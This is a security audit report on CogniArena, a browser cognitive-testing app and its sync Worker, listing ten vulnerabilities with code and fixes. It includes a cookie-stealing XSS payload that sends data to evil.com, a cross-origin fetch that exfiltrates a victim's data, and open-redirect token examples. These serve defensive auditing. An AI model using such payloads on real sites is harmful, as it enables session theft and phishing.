# CogniArena — Pre-Production Security Audit Report

**Audit Date:** July 7, 2026  
**Auditor:** Security Engineering (Automated Static + Manual Review)  
**Scope:** Full client-side application (`brain/src/`, `brain/public/`, `brain/sync-worker/`)  
**Methodology:** Static code analysis, data-flow tracing, configuration review, dependency inspection  

---

## Executive Summary

CogniArena is a browser-based cognitive assessment platform built on Astro + React, deployed to Cloudflare Pages, with an optional Cloudflare Worker + D1 sync backend. The application is largely well-architected from a security standpoint: no `eval()`, no `dangerouslySetInnerHTML`, no hardcoded secrets, and React's default JSX escaping neutralizes most XSS vectors.

However, **10 verified issues** were identified across 4 severity tiers. The most urgent is an **open redirect** in the challenge link resolver that allows arbitrary path injection. The absence of all standard security headers (CSP, HSTS, X-Frame-Options) is a systemic gap that must be closed before production. The sync backend has CORS, rate-limiting, and input-validation weaknesses that expose user data and infrastructure to abuse.

**Risk Summary:**

| Severity | Count | Blocking for Production? |
|----------|-------|--------------------------|
| CRITICAL (P0) | 1 | Yes |
| HIGH (P1) | 3 | Yes |
| MEDIUM (P2) | 4 | Recommended |
| LOW (P3) | 2 | No |

---

## CRITICAL — P0

---

### SEC-01: Open Redirect via Challenge Token

**Severity:** CRITICAL  
**CVSS 3.1 Estimate:** 7.4 (High)  
**Status:** Verified  

**Affected File:**  
`brain/src/pages/challenge/index.astro` — lines 39–42

```js
let route = payload.testId;
if (route === 'reaction') route = 'reaction-time';
window.location.href = `/tests/${route}/?challenge=${token}`;
```

**Description:**  
The challenge link resolver decodes a user-supplied Base64 token from the URL (`?id=`, `#hash`, or trailing path segment), extracts `payload.testId`, and interpolates it directly into a `window.location.href` assignment without any validation or sanitization. Since the token is attacker-crafted, `testId` can contain any string.

**Attack Scenarios:**

1. **Path Traversal Redirect:**
   Craft a token with `testId: "../../about"`. The browser redirects to `/tests/../../about/?challenge=...`, which resolves to `/about/`. While this stays on the same origin, it bypasses intended navigation flows.

2. **Protocol-Relative Redirect (limited):**
   A `testId` beginning with `//evil.com/` could produce `/tests///evil.com//?challenge=...`, which some browsers may interpret as a protocol-relative URL to `evil.com`. This is browser-dependent but has been exploited historically.

3. **Phishing Amplification:**
   An attacker shares a crafted `https://cogniarena.com/challenge/?id=<malicious_token>` link. The domain's reputation lends credibility to the redirect target, enabling credential harvesting or malware distribution.

**Impact:** Users are redirected to attacker-controlled paths or external sites via a trusted domain, enabling phishing campaigns that leverage CogniArena's domain reputation.

**Mitigation:**

```js
// Whitelist of valid testId values
const VALID_TEST_IDS = new Set([
  'reaction-time', 'sound-reaction', 'f1-lights', 'choice-reaction',
  'go-no-go', 'sequence-memory', 'number-memory', 'visual-pattern',
  'dual-n-back', 'verbal-memory', 'pattern-reasoning', 'spatial-orientation',
  'stroop', 'trail-making', 'focus-challenge', 'click-speed',
  'aim-trainer', 'mouse-accuracy', 'flick-trainer', 'typing-speed',
  'decision-speed', 'planning', 'prioritization'
]);

let route = payload.testId;
if (route === 'reaction') route = 'reaction-time';

if (!VALID_TEST_IDS.has(route)) {
  window.location.href = "/";
  return;
}
window.location.href = `/tests/${route}/?challenge=${token}`;
```

---

## HIGH — P1

---

### SEC-02: Missing Security Headers (Entire Application)

**Severity:** HIGH  
**CVSS 3.1 Estimate:** 7.1 (High)  
**Status:** Verified  

**Affected Files:**  
- `brain/public/_headers` — only contains `X-Robots-Tag: noindex` for staging domain  
- `brain/astro.config.mjs` — no header configuration  

**Description:**  
The application serves zero standard security headers. The `_headers` file contains only a single `X-Robots-Tag` directive scoped to the staging domain (`brain-bfn.pages.dev`). The production domain (`cogniarena.com`) and all assets have no protective headers whatsoever.

**Missing Headers:**

| Header | Risk of Absence |
|--------|-----------------|
| `Content-Security-Policy` | No restriction on inline scripts, external resource loading, or eval. XSS payloads execute freely if injected. |
| `X-Frame-Options` / `frame-ancestors` | Site can be embedded in iframes on malicious sites for clickjacking. |
| `X-Content-Type-Options` | Browsers may MIME-sniff responses, enabling XSS via content-type confusion. |
| `Strict-Transport-Security` | First-visit HTTP connections are vulnerable to SSL-stripping (Moxie Marlinspike attack). |
| `Referrer-Policy` | Full URL (including query params with challenge tokens) leaked to third-party sites via Referer header. |
| `Permissions-Policy` | No restriction on browser APIs (camera, microphone, geolocation) that could be abused by injected content. |

**Attack Scenario:**  
An attacker embeds `https://cogniarena.com` in a clickjacking iframe on a phishing site. Because there is no `X-Frame-Options` or CSP `frame-ancestors` directive, the browser renders the page normally. The user believes they are interacting with CogniArena but is actually clicking attacker-placed overlays.

**Impact:** Complete absence of defense-in-depth headers. Any future XSS vulnerability (including SEC-04) becomes immediately exploitable without header-based mitigation.

**Mitigation:**  
Replace `brain/public/_headers` with:

```
# Production
https://cogniarena.com/*
  Content-Security-Policy: default-src 'self'; script-src 'self' https://www.googletagmanager.com https://www.google-analytics.com; img-src 'self' data: https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; connect-src 'self' https://cogniarena-sync.divyyadav.workers.dev https://www.google-analytics.com; frame-ancestors 'none'; base-uri 'self'
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()

# Staging
https://brain-bfn.pages.dev/*
  X-Robots-Tag: noindex
  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
```

---

### SEC-03: Sync Worker Wildcard CORS

**Severity:** HIGH  
**CVSS 3.1 Estimate:** 6.5 (Medium)  
**Status:** Verified  

**Affected File:**  
`brain/sync-worker/index.ts` — line 16

```ts
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  ...
};
```

**Description:**  
The sync Worker responds to all requests with `Access-Control-Allow-Origin: *`, permitting any website to make cross-origin requests and read responses. This applies to both the `/api/sync/push` and `/api/sync/pull` endpoints.

**Attack Scenario:**  
An attacker creates a malicious page at `evil.com` that runs:

```js
fetch('https://cogniarena-sync.divyyadav.workers.dev/api/sync/pull', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ recoveryHash: '<brute-forced-or-leaked-hash>' })
}).then(r => r.json()).then(data => {
  // data.attempts now contains all of the victim's synced scores
  sendToAttackerServer(data);
});
```

Because CORS is wildcard, the browser permits this cross-origin request and the malicious page can read the full response.

**Impact:** Any website can interact with the sync API on behalf of a visitor. Combined with a weak recovery hash (SEC-05), an attacker who obtains or brute-forces a hash can exfiltrate that user's entire synced test history.

**Mitigation:**

```ts
const ALLOWED_ORIGINS = [
  'https://cogniarena.com',
  'https://www.cogniarena.com',
  'https://brain-bfn.pages.dev'
];

function getCorsHeaders(origin: string): Record<string, string> {
  const allowed = ALLOWED_ORIGINS.includes(origin)
    ? origin
    : ALLOWED_ORIGINS[0];
  return {
    'Access-Control-Allow-Origin': allowed,
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Vary': 'Origin',
    'Content-Type': 'application/json'
  };
}
```

---

### SEC-04: i18n innerHTML Injection (Stored XSS Vector)

**Severity:** HIGH  
**CVSS 3.1 Estimate:** 6.8 (Medium)  
**Status:** Verified — latent vulnerability  

**Affected File:**  
`brain/public/i18n.js` — line 41

```js
htmlEls[j].innerHTML = dict[htmlKey];
```

**Description:**  
The i18n engine assigns translation strings to `innerHTML` for all elements with the `data-i18n-html` attribute. The translation data is injected into the page via `window.__i18nData` in `main.astro` (line 105):

```astro
<script is:inline set:html={`window.__i18nData = ${JSON.stringify(translations)};`} />
```

Currently, the translation strings are hardcoded in `brain/src/i18n/translations.ts` and contain only known-safe HTML (e.g., `<strong>` tags). However, the architecture has no sanitization layer — if the translation source is ever changed to an external API, a CMS, a user-editable file, or a compromised build pipeline, arbitrary JavaScript will execute in every visitor's browser.

**Attack Scenario (latent):**  
1. Attacker compromises the build pipeline or translation file.
2. Injects `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">` into a translation string.
3. Every user who loads the affected language locale executes the payload.
4. No CSP (SEC-02) exists to block inline event handlers.

**Impact:** Full account/session compromise for all users. The absence of CSP means there is no secondary defense layer. This is a stored XSS vector waiting for a supply-chain or build-pipeline compromise to activate.

**Mitigation:**  
Add an HTML sanitizer allowlist in `i18n.js`:

```js
var ALLOWED_TAGS = { 'strong': true, 'em': true, 'br': true, 'b': true, 'i': true };

function sanitizeHtml(html) {
  var div = document.createElement('div');
  div.innerHTML = html;
  function clean(node) {
    var children = Array.from(node.childNodes);
    for (var i = 0; i < children.length; i++) {
      var child = children[i];
      if (child.nodeType === 1) { // Element node
        if (!ALLOWED_TAGS[child.tagName.toLowerCase()]) {
          // Replace disallowed element with its text content
          node.replaceChild(document.createTextNode(child.textContent), child);
        } else {
          // Remove all attributes except safe ones
          var attrs = Array.from(child.attributes);
          for (var a = 0; a < attrs.length; a++) {
            child.removeAttribute(attrs[a].name);
          }
          clean(child);
        }
      }
    }
  }
  clean(div);
  return div.innerHTML;
}

// In applyTranslations:
if (dict[htmlKey] !== undefined) {
  htmlEls[j].innerHTML = sanitizeHtml(dict[htmlKey]);
}
```

---

## MEDIUM — P2

---

### SEC-05: Weak Recovery Code Hashing

**Severity:** MEDIUM  
**CVSS 3.1 Estimate:** 5.3 (Medium)  
**Status:** Verified  

**Affected File:**  
`brain/src/runtime/recovery.ts` — lines 42–59

```ts
// Fallback hash (non-browser environments)
let hash = 0;
for (let i = 0; i < normalized.length; i++) {
  hash = (hash << 5) - hash + normalized.charCodeAt(i);
  hash |= 0;
}
return 'fallback-' + Math.abs(hash).toString(16);
```

**Description:**  
The recovery code hashing has two weaknesses:

1. **Fallback hash is a 32-bit DJB2 variant** with a keyspace of ~4 billion values. An attacker with a database dump can brute-force all possible hashes in minutes on a single CPU core.

2. **SHA-256 path has no key stretching.** Even when `crypto.subtle.digest('SHA-256', ...)` is used (the normal browser path), a single iteration of SHA-256 is fast to brute-force. An 8-word code from a 192-word dictionary has ~60.7 bits of entropy (192^8 combinations). With SHA-256 at ~10 billion hashes/second on a GPU, this keyspace can be exhaustively searched in approximately 37 years on consumer hardware — but with cloud GPU clusters or if the word list is known, practical attacks are feasible.

**Attack Scenario:**  
1. Attacker obtains a dump of the D1 database (via SQL injection in a future vulnerability, backup exposure, or infrastructure compromise).
2. Runs a brute-force script against all recovery hashes using the known word list.
3. For each cracked hash, pulls the victim's synced cognitive assessment data via the sync API.

**Impact:** Loss of confidentiality for synced user data. While the data is anonymous (no PII), users may consider their cognitive performance data sensitive.

**Mitigation:**

```ts
export async function hashRecoveryCode(code: string): Promise<string> {
  const normalized = code.trim().toLowerCase().replace(/[^a-z-]/g, '');
  const encoder = new TextEncoder();
  const data = encoder.encode(normalized);

  if (typeof window !== 'undefined' && window.crypto && window.crypto.subtle) {
    // PBKDF2 with 600,000 iterations (OWASP 2023 recommendation for SHA-256)
    const keyMaterial = await window.crypto.subtle.importKey(
      'raw', data, { name: 'PBKDF2' }, false, ['deriveBits']
    );
    const salt = encoder.encode('cogniarena-sync-v1'); // Fixed salt (per-app)
    const derived = await window.crypto.subtle.deriveBits(
      { name: 'PBKDF2', salt, iterations: 600000, hash: 'SHA-256' },
      keyMaterial,
      256
    );
    return Array.from(new Uint8Array(derived))
      .map(b => b.toString(16).padStart(2, '0')).join('');
  }

  // Server-side fallback — must also use PBKDF2 or Argon2
  throw new Error('Secure hashing unavailable');
}
```

Note: The sync worker should also update its hashing to match.

---

### SEC-06: No Sync Payload Size Validation

**Severity:** MEDIUM  
**CVSS 3.1 Estimate:** 5.3 (Medium)  
**Status:** Verified  

**Affected Files:**  
- `brain/sync-worker/index.ts` — line 92  
- `brain/src/runtime/dataLayer.ts` — `triggerSync()`

**Description:**  
The `/api/sync/push` endpoint accepts an `attempts` array of arbitrary length with no size validation at either the client or server side. Each attempt object contains multiple string fields. There is no `Content-Length` check or body size limit.

**Attack Scenarios:**

1. **Database Exhaustion:** Send a push request with 100,000+ attempt records to fill the D1 database beyond its storage quota.

2. **Worker CPU Exhaustion:** Craft a multi-megabyte request body that forces the Worker to spend excessive CPU time parsing JSON and constructing batch SQL statements, potentially hitting the Worker's CPU time limit (10ms on free tier, 30s on paid).

3. **Batch SQL Statement Limit:** Cloudflare D1 has a limit of 100 statements per batch. Sending more than 100 attempts will cause a hard error, but there is no graceful rejection.

**Impact:** Denial of service against the sync backend; potential D1 storage quota exhaustion affecting all users.

**Mitigation:**

```ts
// In sync-worker/index.ts handlePush():
const MAX_ATTEMPTS_PER_PUSH = 100;
const MAX_BODY_SIZE = 1_048_576; // 1 MB

async function handlePush(request: Request, env: Env): Promise<Response> {
  // Check Content-Length header first
  const contentLength = Number(request.headers.get('Content-Length') || '0');
  if (contentLength > MAX_BODY_SIZE) {
    return new Response(JSON.stringify({ error: 'Payload too large' }), {
      status: 413,
      headers: CORS_HEADERS
    });
  }

  const body = await request.json();
  const { recoveryHash, attempts } = body;

  if (!Array.isArray(attempts) || attempts.length > MAX_ATTEMPTS_PER_PUSH) {
    return new Response(JSON.stringify({
      error: `Invalid payload: attempts array must contain at most ${MAX_ATTEMPTS_PER_PUSH} items`
    }), {
      status: 400,
      headers: CORS_HEADERS
    });
  }
  // ... rest of handler
}
```

---

### SEC-07: In-Memory Rate Limiting (Easily Bypassed)

**Severity:** MEDIUM  
**CVSS 3.1 Estimate:** 4.3 (Medium)  
**Status:** Verified  

**Affected File:**  
`brain/sync-worker/index.ts` — lines 22–48

```ts
const rateLimitMap = new Map<string, { count: number; resetTime: number }>();
```

**Description:**  
Rate limiting is implemented as an in-memory `Map` keyed by `CF-Connecting-IP`. This has three fundamental weaknesses:

1. **Cold Start Reset:** Cloudflare Workers are ephemeral. When the Worker instance is recycled (which happens frequently under low traffic), the entire rate limit state is lost. An attacker can wait for a cold start or trigger one by sending requests from many IPs.

2. **Distributed IP Bypass:** An attacker using a botnet, residential proxy network, or Tor can distribute requests across thousands of IPs, each staying under the 10-requests-per-minute limit.

3. **No Per-Endpoint Limits:** The rate limit applies globally per IP, not per endpoint. A single IP can alternate between `/push` and `/pull` without separate tracking.

4. **Memory Leak Risk:** The pruning logic only triggers at 1,000 entries. Under a distributed attack, the map grows unbounded until that threshold.

**Attack Scenario:**  
An attacker uses a proxy rotation service to send 10,000 push requests from 1,000 different IPs (10 each), each uploading 100 fake records. Total: 100,000 bogus records injected into the database with no rate limit effective stop.

**Impact:** Rate limiting provides a false sense of protection. Determined attackers can bypass it trivially.

**Mitigation:**  
Migrate to D1-backed or KV-backed rate limiting:

```ts
// Use D1 for persistent rate limiting
async function checkRateLimit(env: Env, ip: string): Promise<boolean> {
  const now = Date.now();
  const windowStart = now - 60_000;

  // Clean old entries
  await env.DB.prepare(
    'DELETE FROM rate_limits WHERE reset_time < ?'
  ).bind(now).run();

  // Check current count
  const record = await env.DB.prepare(
    'SELECT count FROM rate_limits WHERE ip = ? AND reset_time > ?'
  ).bind(ip, now).first<{ count: number }>();

  if (!record) {
    await env.DB.prepare(
      'INSERT INTO rate_limits (ip, count, reset_time) VALUES (?, 1, ?)'
    ).bind(ip, now + 60_000).run();
    return true;
  }

  if (record.count >= 10) return false;

  await env.DB.prepare(
    'UPDATE rate_limits SET count = count + 1 WHERE ip = ? AND reset_time > ?'
  ).bind(ip, now).run();
  return true;
}
```

Additionally, deploy Cloudflare WAF rules or Turnstile challenges for automated traffic.

---

### SEC-08: Server Error Message Information Disclosure

**Severity:** MEDIUM  
**CVSS 3.1 Estimate:** 3.7 (Low)  
**Status:** Verified  

**Affected File:**  
`brain/sync-worker/index.ts` — line 83

```ts
} catch (err: any) {
  return new Response(JSON.stringify({
    error: 'Internal Server Error',
    message: err.message  // <-- Leaks internal details
  }), {
    status: 500,
    headers: CORS_HEADERS
  });
}
```

**Description:**  
When an unhandled error occurs in the sync Worker, the raw `err.message` is included in the HTTP response. This can expose:

- D1 SQL schema details (e.g., "no such column: user_id")
- Internal Worker configuration (e.g., binding names)
- Stack trace fragments
- Database constraint violations revealing data structure

**Attack Scenario:**  
An attacker sends malformed payloads and observes the error messages to map the D1 database schema, identify column names, and craft targeted SQL injection attempts (even though parameterized queries are currently used, schema knowledge aids future attacks).

**Impact:** Information disclosure that aids further exploitation. Low direct impact but violates defense-in-depth principles.

**Mitigation:**

```ts
} catch (err: any) {
  // Log full error details to Cloudflare's logging infrastructure
  console.error('Sync Worker error:', err);

  return new Response(JSON.stringify({
    error: 'Internal Server Error'
    // No message field — do not leak internals
  }), {
    status: 500,
    headers: CORS_HEADERS
  });
}
```

---

## LOW — P3

---

### SEC-09: Recovery Code UI/Logic Mismatch

**Severity:** LOW  
**Status:** Verified  

**Affected Files:**  
- `brain/src/components/ui/SyncPanel.tsx` — line 127: `"Your 6-Word Recovery Code"`  
- `brain/src/runtime/recovery.ts` — line 24: generates 8-word codes  

```ts
// recovery.ts
const array = new Uint32Array(8); // 8 words
```

```tsx
// SyncPanel.tsx
<span>...Your 6-Word Recovery Code</span>
```

**Description:**  
The UI labels the recovery code as "6-Word" but the generator produces 8-word codes. This creates user confusion during the recovery process — users may count the words and believe the code is malformed, or may truncate it to 6 words when manually entering it on another device.

**Impact:** Usability issue that can cause sync recovery failures. Undermines user confidence in the security mechanism.

**Mitigation:**  
Change `SyncPanel.tsx` line 127 from `"Your 6-Word Recovery Code"` to `"Your 8-Word Recovery Code"`. Also update the placeholder text and any other references.

---

### SEC-10: Google Analytics Tracking ID in Client-Side Source

**Severity:** LOW (Informational)  
**Status:** Verified  

**Affected File:**  
`brain/src/layouts/main.astro` — line 108

```html
<script async src="https://www.googletagmanager.com/gtag/js?id=G-9WHJWEWD5L"></script>
```

**Description:**  
The Google Analytics measurement ID `G-9WHJWEWD5L` is embedded in client-side HTML. This is standard and expected for GA4 — the ID is necessarily public since it appears in every page's source. However, it allows competitors or attackers to:

1. Identify the GA property and its associated Google account.
2. Send fake analytics hits to inflate or pollute the data.
3. Use the ID to confirm that the property is active.

**Impact:** Minimal direct security impact. Standard for any GA4 deployment.

**Mitigation:**  
No action required for the tracking ID itself. To reduce analytics noise, configure GA4 filters in the Google Analytics admin panel to reject hits from unexpected referrers or domains.

---

## INFORMATIONAL — Verified Safe Patterns

The following security-positive findings were confirmed during the audit:

| Check | Result |
|-------|--------|
| `eval()` / `new Function()` / `document.write()` | Not found in any source file |
| `dangerouslySetInnerHTML` in React components | Not used anywhere |
| `postMessage` listeners (cross-origin messaging) | Not present |
| `.env` files with secrets committed | None found |
| Hardcoded API keys or private tokens | None found |
| Contact form injection safety | Uses `encodeURIComponent()` correctly |
| Challenge token decoding safety | Wrapped in `try/catch`, no code execution path |
| All `fetch()` calls use HTTPS | Confirmed |
| `window.open()` uses `noopener,noreferrer` | Confirmed on all instances |
| React JSX auto-escaping | Protects all test component renders |
| IndexedDB data isolation | Scoped per-origin, not accessible cross-origin |
| Recovery code generation | Uses `crypto.getRandomValues()` (CSPRNG) |
| Parameterized SQL queries in sync Worker | All D1 queries use `.bind()` — no string interpolation |

---

## Remediation Priority

| Priority | Finding | Effort | Blocking? |
|----------|---------|--------|-----------|
| 1 | SEC-01: Open Redirect | 15 min | Yes — must fix before launch |
| 2 | SEC-02: Security Headers | 30 min | Yes — must fix before launch |
| 3 | SEC-03: CORS Restriction | 15 min | Yes — must fix before launch |
| 4 | SEC-04: i18n Sanitization | 30 min | Yes — must fix before launch |
| 5 | SEC-06: Payload Size Limits | 15 min | Recommended |
| 6 | SEC-08: Error Disclosure | 5 min | Recommended |
| 7 | SEC-05: PBKDF2 Hashing | 1 hr | Recommended |
| 8 | SEC-07: Persistent Rate Limiting | 2 hr | Recommended |
| 9 | SEC-09: UI Mismatch | 5 min | Cosmetic |
| 10 | SEC-10: GA Tracking ID | No action | Informational |

---

## Recommendations for Future Audits

1. **Automated scanning:** Integrate `npm audit` and Snyk/Socket into CI to catch dependency vulnerabilities.
2. **CSP reporting:** Deploy CSP in report-only mode first, then enforce after validating no false positives.
3. **Sync Worker testing:** Add integration tests that verify CORS origins, rate limiting, and payload validation.
4. **Dependency review:** Schedule quarterly review of `package.json` dependencies for known CVEs.
5. **Penetration test:** After fixing P0-P1 issues, commission a manual penetration test covering the sync Worker and D1 database.
